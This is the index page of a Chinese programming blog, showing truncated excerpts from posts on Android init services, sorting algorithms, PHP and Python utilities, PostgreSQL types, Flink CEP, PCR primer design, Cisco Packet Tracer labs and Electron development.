<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta name="generator" content="Hugo 0.121.1">
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>编程随想</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="编程随想的博客">
		<meta property="og:title" content="编程随想" />
<meta property="og:description" content="编程随想的博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/index.xml" title="编程随想">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程随想" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程随想</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4a34803e665e17cb71a6f636945af0a2/" rel="bookmark">
			Andrid 9.0 init.rc中增加启动自定义service
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		平台 RK3288 + Android 9 概述 本文是基于 Andrid 7.1 启动init.rc中自定义service 关于SELINUX部分的补充说明.
问题 全程参照bootanimation的实现
新增/修改文件列表
anson@server:~/codes/rk3288_pie$ git status system/sepolicy/ On branch master Your branch is behind 'origin/master' by 6 commits, and can be fast-forwarded. (use "git pull" to update your local branch) Changes not staged for commit: (use "git add &lt;file&gt;..." to update what will be committed) (use "git checkout -- &lt;file&gt;..." to discard changes in working directory) modified: system/sepolicy/prebuilts/api/28.0/private/compat/26.0/26.0.ignore.cil modified: system/sepolicy/prebuilts/api/28.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4a34803e665e17cb71a6f636945af0a2/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e95d434e36be0a98db05dc9805880a06/" rel="bookmark">
			python实现【插入排序】（InsertSort）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		python实现【插入排序】（InsertSort） 算法原理及介绍 插入排序（Insertion-Sort）的算法描述是一种简单直观的排序算法。它的工作原理是通过构建有序序列，对于未排序数据，在已排序序列中从后向前扫描，找到相应位置并插入。
算法过程描述 具体算法描述如下：
从第一个元素开始，该元素可以认为已经被排序；
取出下一个元素，在已经排序的元素序列中从后向前扫描；
如果该元素（已排序）大于新元素，将该元素移到下一位置；
重复步骤3，直到找到已排序的元素小于或者等于新元素的位置；
将新元素插入到该位置后；
重复步骤2~5。
注意: 在从后向前扫描过程中，需要反复把已排序元素逐步向后挪位，为最新元素提供插入空间。
算法排序图解如下 python实现代码 def insertSort(arr): n = len(arr) for i in range(1,n): preIndex = i - 1 current = arr[i] # 保存当前需要进行插入元素值 while preIndex &gt;= 0 and arr[preIndex] &gt; current: # 在已排序数组中找到cunrent值能够放下的相应索引位置 arr[preIndex + 1] = arr[preIndex] # 元素后移,为需要插入的元素腾位置 preIndex -= 1 arr[preIndex + 1] = current return arr 想了解其他排序相关算法可以，看作者的排序算法专栏。
如果喜欢作者，欢迎点赞、收藏及关注，谢谢！
欢迎扫描下面二维码关注公众号:阿旭算法与机器学习， 可以和作者共同学习交流。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d663e48a786aa74722eb8ae1170598d9/" rel="bookmark">
			php显示刚刚、几分钟前、几小时前、几天前的函数
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		php把时间转换为友好时间段，如刚刚、几分钟前、几小时前、几天前的简单函数代码。通过把时间格式转换为时间戳，并把当前的时间戳减去之前时间的时间戳，相减后的时间戳除以相对应的秒数得到刚刚、几分钟前、几小时前、几天前的展示。 /* * @param $posttime 时间：2017-08-12 18:18:18 */ function time_ago($posttime){ //当前时间的时间戳 $nowtimes = strtotime(date('Y-m-d H:i:s'),time()); //之前时间参数的时间戳 $posttimes = strtotime($posttime); //相差时间戳 $counttime = $nowtimes - $posttimes; //进行时间转换 if($counttime&lt;=10){ return '刚刚'; }else if($counttime&gt;10 &amp;&amp; $counttime&lt;=30){ return '刚才'; }else if($counttime&gt;30 &amp;&amp; $counttime&lt;=60){ return '刚一会'; }else if($counttime&gt;60 &amp;&amp; $counttime&lt;=120){ return '1分钟前'; }else if($counttime&gt;120 &amp;&amp; $counttime&lt;=180){ return '2分钟前'; }else if($counttime&gt;180 &amp;&amp; $counttime&lt;3600){ return intval(($counttime/60)).'分钟前'; }else if($counttime&gt;=3600 &amp;&amp; $counttime&lt;3600*24){ return intval(($counttime/3600)).'小时前'; }else if($counttime&gt;=3600*24 &amp;&amp; $counttime&lt;3600*24*2){ return '昨天'; }else if($counttime&gt;=3600*24*2 &amp;&amp; $counttime&lt;3600*24*3){ return '前天'; }else if($counttime&gt;=3600*24*3 &amp;&amp; $counttime&lt;=3600*24*20){ return intval(($counttime/(3600*24))).
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d663e48a786aa74722eb8ae1170598d9/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c20a551fba067d8730b40a8a0ff174b8/" rel="bookmark">
			微信支付点金计划和商家小票的开发教程
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		微信支付成功的跳转页面，点金计划和商家小票的开发教程
最近和一家企业合作，考虑怎么流量互换，于是就有了微信支付完后的跳转页面，利用微信的点金计划，展示商家小票的功能，作为初步方案。
直接进入主题，下面详细介绍代码开发方面需要注意的点（坑）：
1、微信支付后跳转展示的页面， 叫点金计划，能够展示商家小票。商家小票就是展示自己写的内容。
2、官方的开发指引： https://http://wx.gtimg.com/pay/download/goldplan/goldplan_developer_guideline_v1.pdf?download
官方文档基本都说的很详细了，也挺简单的，重点要注意几点。
ps1: 调试时，扫描二维码的微信号，与支付该笔测试订单的微信号要一样。 否则不会出来商家小票，显示无法获取订单号。
ps2：外跳新页面（jumpOut 事件）外跳事件，暂不支持跳转小程序，原本计划点击商家小票，利用 &lt;wx-open-launch-weapp&gt; 跳转到小程序的,发现不支持，只能跳到新的html 页面，用户还得再次点击才能跳转小程序（非常影响用户体验，更别提转化了）
ps3：商家小票不显示，一片空白（注意不是无法获取订单信息哦），这是几乎都会遇到的坑，我们引入 VConsole.js 就能在微信打开调试器，找到问题所在，问题出在 html 的 fon-size = 0； 所以导致使用了rem 的元素都无法显示。（下面会介绍怎么用VConsole.js，超简单，超好用）
上图：类似小程序的调试器
ps4：使用商家小票必须引入官方的这个js,否则会受到处罚
&lt;script type="text/javascript" charset="UTF-8" src="https://http://wx.gtimg.com/pay_h5/goldplan/js/jgoldplan-1.0.0.js"&gt;&lt;/script&gt; ps5: 因为商家小票页面不能动态获取屏幕宽高，所以直接设置。
// 解决进入商家小票 html的font-size = 0的问题(商家小票无法动态获取屏幕宽)，请勿随意改动
document.querySelector(‘html’).style.fontSize = “10px”;
ps6：调试需要将写好的页面发布到线上，因为要用https链接。
打开调试器：VConsole.js
第一步引用js:
&lt;script src="https://http://wechatfe.github.io/vconsole/lib/vconsole.min.js?v=3.2.0"&gt;&lt;/script&gt; 第二部，初始化：
// 调试专用，vconsole
const vConsole = new VConsole();
然后就可以了，跟之前一样，使用console.log()打印，当在微信打开网页时，就会看到和微信小程序一样的调试器了。
下一期将会带大家一起使用 开放标签，微信内，h5页面跳转到小程序的功能。
如果有哪里不明白或者更好的建议的小伙伴可以一起讨论哦！最下面会附上代码片段。
基本代码块： &lt;div class="jumpnjfMiniProgram"&gt; &lt;img src="http://...." class="btn" id="tojumpbtn"/&gt; &lt;/div&gt; // 初始化 $(function() { // 加载商家小票 let mchData ={action:'onIframeReady',displayStyle:'SHOW_CUSTOM_PAGE'}; let postData = JSON.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c20a551fba067d8730b40a8a0ff174b8/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d2d5d37184803d996ff2e14dca3708d1/" rel="bookmark">
			蓝牙BLE5.1手柄方案
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在家庭娱乐应用领域中电线电缆链接将最终被无线技术取代，并通过无线技术提升人们的娱乐性及便利性。目前，便携式开关、智能遥控器、移动电话、以及游戏手柄等移动设备都有使用无线技术来保持与娱乐影音设备和家用电器的连接。
目前市面上的蓝牙手柄种类非常多，现有的蓝牙手柄通常为：采用蓝牙BLE4.0芯片，并设置复杂的方向按键、内置传感器、震动电机等设备实现对手机游戏的操控。由于方向按键的电路、内置的传感器、震动电极等设备非常的耗电，并且蓝牙BLE4.0也较为耗电，因此，使得蓝牙手柄更换电池频繁，使用成本高。因此，提出一种改善蓝牙手柄耗电问题的方案非常有必要。
伦茨科技-蓝牙BLE5.1手柄方案
蓝牙BLE5.1手柄方案，本方案使用伦茨科技最新蓝牙BLE5.1芯片ST17H66，通过手柄开关按键控制蓝牙开关，开启闪蓝灯，进入蓝牙等待配对状态，手机连接蓝牙后灯长亮，关时灯灭，手柄开启，未连接蓝牙状态3分钟进入休眠状态，灯灭；手柄开启，已连接状态不进入休眠状态。无需使用App，直接手机蓝牙连接蓝牙手柄，蓝牙游戏手柄通过物理按键模拟用户点击屏幕的解决方案。
伦茨科技蓝牙BLE5.1手柄方案核心技术优势
低功耗蓝牙5.1
连接稳定，控制精确
支持2.4G，Win/Ios/Android系统，
支持PS5，Xbox等主机
单芯片全集成多合一功能，支持OTA
方案规格
使用ST17H66蓝牙BLE5.1芯片，稳定、成熟，已经商用
成本低，可以与现有产品结合
开发周期短，所有基础开发都已经完成，只需要开发用户接口和结构既可以完成
伦茨科技拥有自主研发数传应用芯片BLE 5.0和高速传输芯片BLE 5.1并具有全球知识产权 ，针对企业用户和个人消费者，提供智能音频类全套量产产品的解决方案，配套全方位APP软件平台定制开发。随着物联网基础设施逐渐布局，伦茨科技已在共享经济、人脸识别，美颜/美妆，直播云台、智慧医疗、个人洗护，人机交互等多个领域独具优势。
最新推出的ST17H66蓝牙BLE5.1芯片，支持蓝牙Mesh，支持一对多，多对多等控制模式，为企业提供“交钥匙”式解决方案，备有全面详细的参考设计，方便客户快速开发产品和面市，第一时间抢占物联网先机。
BLE5.1 ST17H66蓝牙芯片特征
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/aa831109c338d735dfbb754f85280f4b/" rel="bookmark">
			C语言概述：什么是C语言？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一提到语言这个词语，自然会想到的是像英语、汉语等这样的自然语言，因为它是人和人交换信息不可缺少的工具。
而今天计算机遍布了我们生活的每一个角落，除了人和人的相互交流之外，我们必须和计算机角落。
用什么的什么样的方式和计算机做最直接的交流呢？人们自然想到的是最古老也最方便的方式——语言，而C语言就是人和计算机交流的一种语言。
语言是用来交流沟通的。有一方说，有另一方听，必须有两方参与，这是语言最重要的功能：
说的一方传递信息，听的一方接收信息；
说的一方下达指令，听的一方遵循命令做事情。
语言是人和人交流，C语言是人和机器交流。只是，人可以不听另外一个人，但是，计算机是无条件服从。
语言有独特的语法规则和定义，双方必须遵循这些规则和定义才能实现真正的交流。
C语言特点
1) 优点
代码量小
执行速度快
功能强大
编程自由
2) 缺点
写代码实现周期长
可移植性较差
过于自由，经验不足易出错
对平台库依赖较多
课程链接：
轻松掌握C语言视频教程
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8a87fc631533dc63cc8f0c8c1b688c15/" rel="bookmark">
			游标：指向一个结果集的指针
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		---游标：指向一个结果集的指针
--便于理解的来说：指针就可以当做是这个结果集，循环这个指针，就可以拿到该结果集里的数据、
分为：隐式游标 和 显式游标
-----------隐式游标：SELECT .... INTO ...
--需要注意：
1、查询的结果只能是1行，不能是0行或者多行
2、不需要声明，直接可以使用
-----------显示游标： --声明显式游标的语法结构： DECLARE --声明的部分 CURSOR 游标名[(参数1 数据类型[,参数2 数据类型.....])] IS SELECT 结果集; BEGIN --逻辑体 END; --开发规范：游标名以 C_ 开头 --使用/执行游标的语法结构：2种
--第1种：需要手动去打开游标，提取数据，关闭游标 DECLARE --声明部分 BEGIN --逻辑体 OPEN 游标名[(实际参数1[，实际参数2...])]; --打开游标 FETCH 游标名 INTO 变量; --提取数据 CLOSE 游标名; --关闭游标（千万别忘了！） END; --第二种：
不需要手动，用FOR循环去拿到游标中的值 DECLARE --声明部分 BEGIN FOR 循环变量 IN 游标名 LOOP --循环体 END LOOP; END; --需要注意的是：
1、显式游标需要手动声明，然后才能被使用
2、显示游标的指向的结果集可以是0行或者多行结果(包括1行)
3、使用/执行游标的方式：
1）方式1：手动管理：打开，提取，关闭
2）方式2：用for循环根据结果集的行数，依次可以拿到每一行的数据(不需要手动管理)
4、结果集时什么样子(列名，数据 等)，那么在执行/使用这个游标的时候，用到的就是啥
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8a87fc631533dc63cc8f0c8c1b688c15/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6a5abb069c1b7645f9c6adabf5538f8a/" rel="bookmark">
			python编写小游戏教程_用Python开发 写个消消乐小游戏
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		提到开心消消乐这款小游戏，相信大家都不陌生，其曾在 2015 年获得过玩家最喜爱的移动单机游戏奖，受欢迎程度可见一斑，本文我们使用 Python 来做个简单的消消乐小游戏。
实现
消消乐的构成主要包括三部分：游戏主体、计分器、计时器，下面来看一下具体实现。
先来看一下游戏所需 Python 库。
定义一些常量，比如：窗口宽高、网格行列数等，代码如下
接着创建一个主窗口，代码如下：
看一下效果：
再接着在窗口中画一个 8 x 8 的网格，代码如下：
看一下效果：
再接着在网格中随机放入各种拼图块，代码如下：
看一下效果：
再接着加入计分器和计时器，代码如下：
看一下效果：
当设置的游戏时间用尽时，我们可以生成一些提示信息，代码如下：
看一下效果：
说完了游戏图形化界面相关的部分，我们再看一下游戏的主要处理逻辑。
我们通过鼠标来操纵拼图块，因此程序需要检查有无拼图块被选中，代码实现如下：
我们需要将鼠标连续选择的拼图块进行位置交换，代码实现如下：
每一次交换拼图块时，我们需要判断是否有连续一样的三个及以上拼图块，代码实现如下：
def isMatch(self):for x in range(NUMGRID):for y in range(NUMGRID):if x + 2 &lt; NUMGRID:if self.getGemByPos(x, y).type == self.getGemByPos(x+1, y).type == self.getGemByPos(x+2, y).type:return [1, x, y]if y + 2 &lt; NUMGRID:if self.getGemByPos(x, y).type == self.getGemByPos(x, y+1).type == self.getGemByPos(x, y+2).type:return [2, x, y]return [0, x, y]
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6a5abb069c1b7645f9c6adabf5538f8a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/eea2f41d5352275df4cf5f403517b0f8/" rel="bookmark">
			Flink-Cep实现规则动态更新
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Flink-Cep实现规则动态更新 规则引擎通常对我们的理解就是用来做模式匹配的，在数据流里面检测满足规则要求的数据。有人会问为什么需要规则动态变更呢？直接修改了规则把服务重启一下不就可以了吗，这个当然是不行的，规则引擎里面通常会维护很多不同的规则，例如在监控告警的场景下，如果每个人修改一下自己的监控阈值，就重启一下服务，必然会影响其他人的使用，因此需要线上满足规则动态变更加载。本篇基于Flink-Cep 来实现规则动态变更加载，同时参考了Flink中文社区刘博老师的分享(https://developer.aliyun.com/article/738454)，在这个分享里面是针对在处理流中每一个Key使用不同的规则，本篇的讲解将不区分key的规则。
实现分析 •外部加载：通常规则引擎会有专门的规则管理模块，提供用户去创建自己的规则，对于Flink任务来说需要到外部去加载规则•动态更新：需要提供定时去检测规则是否变更•历史状态清理：在模式匹配中是一系列NFAState 的不断变更，如果规则发生变更那么这些State也就是无用的了，需要清理掉•易容的API: 不同的业务开发人员可能会有自己的规则管理、定时策略等，那么需要对外提供易用的API
实现步骤 用户API定义: InjectionPatternFunction 用于获取、定义用户的规则 package org.apache.flink.cep.functions; import org.apache.flink.api.common.functions.Function;import org.apache.flink.cep.pattern.Pattern; import java.io.Serializable; /** * @param &lt;T&gt; */public interface InjectionPatternFunction&lt;T&gt; extends Function, Serializable { /** * 你可能有一些初始化的工作 */ public void init() throws Exception; /** * 获取新的pattern * @return */ public Pattern&lt;T,T&gt; inject() throws Exception; /** * 一个扫描周期:ms * @return */ public long getPeriod() throws Exception; /** * 规则是否发生变更 * @return */ public boolean isChanged() throws Exception;} 那么如何将这个API暴露出去呢？正常情况的使用是：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/eea2f41d5352275df4cf5f403517b0f8/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/00f6b81b96754f4eb46bba8f898e08a1/" rel="bookmark">
			从零开始学PCR技术（三）：PCR引物设计
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		扩增子测序在临床基因检测中有广泛应用，合理的 Panel 设计非常重要，而 Panel 设计最终要落地，精心设计引物就是重中之重了。
本文通过公开资料整理而成，志在让外行了解一些引物设计的基础知识，深入研究请参考专业文献。本文仅供学习参考，不构成任何具体建议。
背景：DNA 热力学 DNA 热力学是指温度影响双链 DNA（double-stranded DNA，dsDNA）的核酸结构。这部分知识是难的，但如果不深入了解，引物设计过程中可能会犯许多错误。
一些基础概念：
杂交：正常情况下，寡核苷酸、DNA 或 RNA 会绑定到其互补序列，互补序列的碱基之间通过氢键连接，最常见的是，核酸碱基对以 A = T 和 G≡C 的方式成对形成，其中后者更稳定(由于氢键数较多)。
溶液中的DNA 变性：又称 DNA 解链或融化，是 DNA 双链因为加热温度升高或者化学物质的诱导变成单链的过程。我们把 DNA 双链解开一半时所需要的温度称为融点（Melting temperature, Tm）。Tm依赖于 DNA 分子的长度及其特定的核酸序列组成。
复性：又称退火。单链 DNA 或 RNA 与互补的探针或引物结合形成配对的双链核苷酸的过程。
关于 PCR 的 7 个谬误及改进办法 Myth 1: PCR Nearly Always Works and Design Is Not that Important 谬误 1：PCR 随便弄就行了，反正都能工作。
有些时候或许确实如此，尤其是一重 PCR 的时候，但如果是多重 PCR 就必须要精心设计了。
Myth 2: Different Methods for Predicting Hybridization Tm Are Essentially Equivalent in Accuracy 谬误 2：随便一种方法预测寡核苷酸的 Tm值准确性都差不多。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/00f6b81b96754f4eb46bba8f898e08a1/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8acc268cee2a8ec7d4ef6e5bcd2c5e8d/" rel="bookmark">
			Python时间模块
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		https://blog.csdn.net/wuwei_201/article/details/105164151
目录 一、datetime模块 1、date 类2、time 类3、datetime 类4、strftime 方法5、strptime 方法6、replace 方法7、timedelta 类8、tzinfo 和 timezone 二、dateutil 模块 1、relativedelta 类2、paser 类 三、pytz 模块 1、查看时区，给时间添加时区属性2、localize和astimezone 给时间增加时区属性和时间的时区转换 一、datetime模块 datetime模块提供用于处理日期和时间的类。支持日期时间数学运算，更着重于有效地解析其属性用于格式化输出和数据操作。
官方文档
datetime模块中常用的和方法有：date、time、datetime、strtime、strftime、strptime、replace
导入模块：
import datetime 1 1、date 类 datetime模块中的一个类，用于创建一个包含年月日的日期
d = datetime.date(2020, 3, 23) # date的参数必须是int，需要注意的是1月就是1不是01 print(d) print(d.year) # 获取时间变量的年份，月份：d.month 日期： d.day print(datetime.date.today()) # 今天的日期 print(d.weekday()) # 返回日期是周几，周一是0 print(d.isoweekday()) # 返回日期是周几，周一是1, isoweekday = weekday()+1 2、time 类 datetime模块中的一个类，用于创建一个包含时分秒的时间（每天24x60x60秒）
d = datetime.time(8, 3, 15, 30) # default: tzinfo=None print(d) print(d.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8acc268cee2a8ec7d4ef6e5bcd2c5e8d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6ec6250fc700bd9aa1a940e545201852/" rel="bookmark">
			PostgreSQL  8.5. 日期/时间类型  ,时间戳
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		8.5. 日期/时间类型 8.5.1. 日期/时间输入
8.5.2. 日期/时间输出
8.5.3. 时区
8.5.4. 间隔输入
8.5.5. 间隔输出
PostgreSQL支持SQL中所有的日期和时间类型，如表 8.9所示。这些数据类型上可用的操作如第 9.9 节所述。日期根据公历来计算，即使对于该历法被引入之前的年份也一样（见第 B.5 节）。
表 8.9. 日期/时间类型
名字存储尺寸描述最小值最大值解析度timestamp [ (p) ] [ without time zone ]8字节包括日期和时间（无时区）4713 BC294276 AD1微秒timestamp [ (p) ] with time zone8字节包括日期和时间，有时区4713 BC294276 AD1微秒date4字节日期（没有一天中的时间）4713 BC5874897 AD1日time [ (p) ] [ without time zone ]8字节一天中的时间（无日期）00:00:0024:00:001微秒time [ (p) ] with time zone12字节仅仅是一天中的时间（没有日期），带有时区00:00:00+145924:00:00-14591微秒interval [ fields ] [ (p) ]16字节时间间隔-178000000年178000000年1微秒 注意 SQL要求只写timestamp等效于timestamp without time zone，并且PostgreSQL鼓励这种行为。timestamptz被接受为timestamp with time zone的一种简写，这是一种PostgreSQL的扩展。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6ec6250fc700bd9aa1a940e545201852/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/371c78656b4d97e0be4c310ac8ccba37/" rel="bookmark">
			PostgreSQL .数据类型普通数据类型
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		PostgreSQL有着丰富的本地数据类型可用。用户可以使用CREATE TYPE命令为 PostgreSQL增加新的数据类型。
表 8.1显示了所有内建的普通数据类型。大部分在“别名”列里列出的可选名字都是因历史原因 被PostgreSQL在内部使用的名字。另外，还有一些内部使用的或者废弃的类型也可以用，但没有在这里列出。
表 8.1. 数据类型
名字别名描述bigintint8有符号的8字节整数bigserialserial8自动增长的8字节整数bit [ (n) ] 定长位串bit varying [ (n) ]varbit [ (n) ]变长位串booleanbool逻辑布尔值（真/假）box 平面上的普通方框bytea 二进制数据（“字节数组”）character [ (n) ]char [ (n) ]定长字符串character varying [ (n) ]varchar [ (n) ]变长字符串cidr IPv4或IPv6网络地址circle 平面上的圆date 日历日期（年、月、日）double precisionfloat8双精度浮点数（8字节）inet IPv4或IPv6主机地址integerint, int4有符号4字节整数interval [ fields ] [ (p) ] 时间段json 文本 JSON 数据jsonb 二进制 JSON 数据，已分解line 平面上的无限长的线lseg 平面上的线段macaddr MAC（Media Access Control）地址macaddr8 MAC（Media Access Control）地址（EUI-64格式）money 货币数量numeric [ (p, s) ]decimal [ (p, s) ]可选择精度的精确数字path 平面上的几何路径pg_lsn PostgreSQL日志序列号point 平面上的几何点polygon 平面上的封闭几何路径realfloat4单精度浮点数（4字节）smallintint2有符号2字节整数smallserialserial2自动增长的2字节整数serialserial4自动增长的4字节整数text 变长字符串time [ (p) ] [ without time zone ] 一天中的时间（无时区）time [ (p) ] with time zonetimetz一天中的时间，包括时区timestamp [ (p) ] [ without time zone ] 日期和时间（无时区）timestamp [ (p) ] with time zonetimestamptz日期和时间，包括时区tsquery 文本搜索查询tsvector 文本搜索文档txid_snapshot 用户级别事务ID快照uuid 通用唯一标识码xml XML数据 兼容性 下列类型（或者及其拼写）是SQL指定的：bigint、bit、bit varying、boolean、char、character varying、character、varchar、date、double precision、integer、interval、numeric、decimal、real、smallint、time（有时区或无时区）、timestamp（有时区或无时区）、xml。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/371c78656b4d97e0be4c310ac8ccba37/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/852cf5e99c09fc7c6c6132c73af3d312/" rel="bookmark">
			计算机网络实验Cisco Packet Tracer使用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		计算机网络实验Cisco Packet Tracer使用 前言1）Cisco Packet Tracer简介2）下载安装 一.Cisco Packet Tracer 实验1.直接连接两台 PC 构建 LAN2.用交换机构建 LAN3.交换机接口地址列表4.生成树协议（Spanning Tree Protocol）5.路由器配置初步6.静态路由7.动态路由 RIP8.动态路由 OSPF9.基于端口的网络地址翻译 PAT10.虚拟局域网 VLAN10.虚拟局域网管理 VTP11.VLAN 间的通信12.DHCP、DNS及Web服务器简单配置13.WLAN初步配置 实验总结 前言 我们先了解 VLSM、CIDR、RIP、OSPF、VLAN、STP、NAT 及 DHCP 等概念，以能够进行网络规划和配置。（可以参考博主前面的博客）
1）Cisco Packet Tracer简介 简介：Cisco Packet Tracer是Cisco公司发布的一个辅助学习工具，为学习思科网络课程的初学者去设计、配置、排除网络故障提供了网络模拟环境。用户可以在软件的图形用户界面上直接使用拖曳方法建立网络拓扑，并可提供数据包在网络中行进的详细处理过程，观察网络实时运行情况。可以学习IOS的配置、锻炼故障排查能力。
2）下载安装 高速下载，奉上链接：: 下载链接.
安装步骤： 步骤.
以上是软件的完整信息，。但是下载之后我们发现需要登录才可以使用，所以我为大家准备了注册的链接
官网注册.重要的是不收费。
注册就完事了
一.Cisco Packet Tracer 实验 1.直接连接两台 PC 构建 LAN 将两台 PC 直接连接构成一个网络。注意：直接连接需使用交叉线。
进行两台 PC 的基本网络配置，只需要配置 IP 地址即可，然后相互 ping 通即成功。
配置PC1，PC2
使用PC1pingPC2
2.用交换机构建 LAN 构建如下拓扑结构的局域网
✎ 问题
PC0 能否 ping 通 PC1、PC2、PC3 ？
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/852cf5e99c09fc7c6c6132c73af3d312/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b60dae69ade42c257b3fdbc9d072d608/" rel="bookmark">
			D2D绘制文本
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		#include &lt;windows.h&gt; #include &lt;d2d1.h&gt; #include &lt;d2d1helper.h&gt; #include &lt;dwrite.h&gt; #pragma comment(lib, "dwrite.lib") #pragma comment(lib, "d2d1.lib") void CMFCApplication2Dlg::OnBnClickedButton3() { ID2D1Factory * g_factory; ID2D1HwndRenderTarget * g_render_target; ID2D1SolidColorBrush * g_brush; IDWriteFactory * g_write_factory; IDWriteTextFormat * g_text_format; D2D1CreateFactory(D2D1_FACTORY_TYPE_SINGLE_THREADED, &amp;g_factory); RECT rc; ::GetClientRect(m_hWnd, &amp;rc); g_factory-&gt;CreateHwndRenderTarget( D2D1::RenderTargetProperties(), D2D1::HwndRenderTargetProperties(m_hWnd, D2D1::SizeU(rc.right - rc.left, rc.bottom - rc.top)), &amp;g_render_target); g_render_target-&gt;CreateSolidColorBrush(D2D1::ColorF(0xf0f0f0), &amp;g_brush); // Init Font DWriteCreateFactory(DWRITE_FACTORY_TYPE_SHARED, __uuidof(g_write_factory), reinterpret_cast&lt;IUnknown **&gt;(&amp;g_write_factory)); g_write_factory-&gt;CreateTextFormat(L"Tahoma", NULL, DWRITE_FONT_WEIGHT_NORMAL, DWRITE_FONT_STYLE_NORMAL, DWRITE_FONT_STRETCH_NORMAL, 11, L"", &amp;g_text_format); if (!g_render_target) return; g_render_target-&gt;BeginDraw(); // Clear Background g_render_target-&gt;Clear(D2D1::ColorF(0x535353)); // Draw Text const wchar_t * text = L"
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b60dae69ade42c257b3fdbc9d072d608/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d4648630783fba92ece5883f2332f1cd/" rel="bookmark">
			Electron使用指南 - [13] 显示列表
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		屏幕快照的图片获取生成以后，将返回的信息显示在列表里。
1、重新规划 Store 重新规划 Store, 使用 Vuex 模块来分开管理数据。在 /src/store/ 创建 modules 文件夹, 在文件里创建 main.js 与 modal.js 两个文件。将 /src/store/index.js 文件里的代码迁移到 modal.js 里，做修改。三个文件的内容如下：
1.1 index.js 修改 /src/store/index.js：
import Vue from 'vue' import Vuex from 'vuex' Vue.use(Vuex) import modal from './modules/modal' import main from './modules/main' export default new Vuex.Store({ modules: { modal, main } }) 1.2 modal 编辑 /src/store/modules/modal.js
